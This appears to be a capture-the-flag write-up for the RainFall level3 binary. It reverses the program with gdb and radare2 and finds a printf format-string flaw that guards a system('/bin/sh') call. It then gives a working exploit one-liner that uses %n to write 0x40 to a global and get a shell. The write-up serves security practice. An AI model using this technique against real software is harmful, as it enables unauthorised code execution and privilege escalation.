We start this level by looking at our executable with gdb:
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
```

We notice a `v()` function, let's have a look at it with `radare2`:
```bash
[0x080483f0]> pdf @ sym.v
            ; CALL XREF from sub.main_804851a @ 0x8048520(x)
┌ 118: sym.v ();
│ afv: vars(4:sp[0x20c..0x218])
│           0x080484a4      55             push ebp
│           0x080484a5      89e5           mov ebp, esp
│           0x080484a7      81ec18020000   sub esp, 0x218
│           0x080484ad      a160980408     mov eax, dword [obj.stdin]  ; obj.stdin__GLIBC_2.0
│                                                                      ; [0x8049860:4]=0
│           0x080484b2      89442408       mov dword [nitems], eax     ; FILE *stream
│           0x080484b6      c744240400..   mov dword [size], 0x200     ; [0x200:4]=-1 ; 512 ; int size
│           0x080484be      8d85f8fdffff   lea eax, [format]
│           0x080484c4      890424         mov dword [esp], eax        ; char *s
│           0x080484c7      e8d4feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x080484cc      8d85f8fdffff   lea eax, [format]
│           0x080484d2      890424         mov dword [esp], eax        ; const char *format
│           0x080484d5      e8b6feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080484da      a18c980408     mov eax, dword [obj.m]      ; [0x804988c:4]=0
│           0x080484df      83f840         cmp eax, 0x40               ; '@' ; 64
│       ┌─< 0x080484e2      7534           jne 0x8048518
│       │   0x080484e4      a180980408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│       │                                                              ; [0x8049880:4]=0
│       │   0x080484e9      89c2           mov edx, eax
│       │   0x080484eb      b800860408     mov eax, str.Wait_what___n  ; 0x8048600 ; "Wait what?!\n"
│       │   0x080484f0      8954240c       mov dword [stream], edx     ; FILE *stream
│       │   0x080484f4      c74424080c..   mov dword [nitems], 0xc     ; [0xc:4]=-1 ; 12 ; size_t nitems
│       │   0x080484fc      c744240401..   mov dword [size], 1         ; size_t size
│       │   0x08048504      890424         mov dword [esp], eax        ; const void *ptr
│       │   0x08048507      e8a4feffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
│       │   0x0804850c      c704240d86..   mov dword [esp], str._bin_sh ; [0x804860d:4]=0x6e69622f ; "/bin/sh" ; const char *string
│       │   0x08048513      e8a8feffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from sym.v @ 0x80484e2(x)
│       └─> 0x08048518      c9             leave
└           0x08048519      c3             ret
```

This shows us a system call executing `/bin/sh`that we're going to try to exploit.
We are going to start by exploiting `printf`:
```bash
level3@RainFall:~$ ./level3
AAAA %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
```

With this return we can deduce that our input is **stored in the 4th position relative to the first outputed %x**.

We know that the comparison goes like this:
```bash
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
```

So let's create a script using printf's **string formatting** to write **0x40 at the wanted address**
```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"' && cat) | ./level3
```
- `print "\x8c\x98\x04\x08"` -> It places the address `0x0804988c` on the stack followed by a format string that prints 60 characters (using `%60c`) to prepare the exact number of bytes for the write operation.
- `"%60c%4$n"` -> Take the 4th argument from the stack, interpret it as a pointer, and write the number of characters printed so far into that pointer.

And we get our next flag !